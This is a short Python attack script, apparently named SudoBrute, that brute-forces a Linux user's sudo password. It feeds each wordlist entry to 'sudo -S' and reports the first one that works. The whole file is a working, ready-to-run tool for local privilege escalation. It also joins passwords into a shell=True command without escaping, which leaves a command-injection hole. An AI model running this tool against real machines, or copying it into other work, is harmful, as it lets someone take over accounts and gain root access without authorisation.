#!/usr/bin/python3
import os
import sys
import subprocess
from datetime import datetime
def banner():
    print("\n ____            _       ____             _       ")
    print("/ ___| _   _  __| | ___ | __ ) _ __ _   _| |_ ___ ")
    print("\___ \| | | |/ _` |/ _ \|  _ \| '__| | | | __/ _ \\")
    print(" ___) | |_| | (_| | (_) | |_) | |  | |_| | ||  __/")
    print("|____/ \__,_|\__,_|\___/|____/|_|   \__,_|\__\___|Coded by Black0x\n\n")
def login(password):
    p = subprocess.call("echo " + password + " | sudo -S ifconfig", shell=True, stdout=open(os.devnull, "w"), stderr=subprocess.STDOUT)
    return p
def brute(wordlist):
    while True:
        password = wordlist.readline().strip()
        if password == "":
            print("[-] Finished!")
            break
        else:
            sys.stdout.write("[-] Testing password: " + password + "             \r")
            sys.stdout.flush()
            if login(password) == 0:
                print("[*] Password found: " + password + "                                     ")
                break
def main():
    banner()
    print("Started at: " + str(datetime.time(datetime.now())) + "\n")
    if len(sys.argv) == 2:
        wordlist_file = sys.argv[1]
        try:
            wordlist = open(wordlist_file, "r")
            print("[-] Starting brute force")
            brute(wordlist)
        except IOError:
            print("[!] Error: wrong wordlist file " + wordlist_file)
    else:
        print("[!] Usage: ./SudoBrute.py <wordlist>")
    raise KeyboardInterrupt
try:
    main()
except KeyboardInterrupt:
    print("\nEnded at: " + str(datetime.time(datetime.now())))
    os._exit(1)
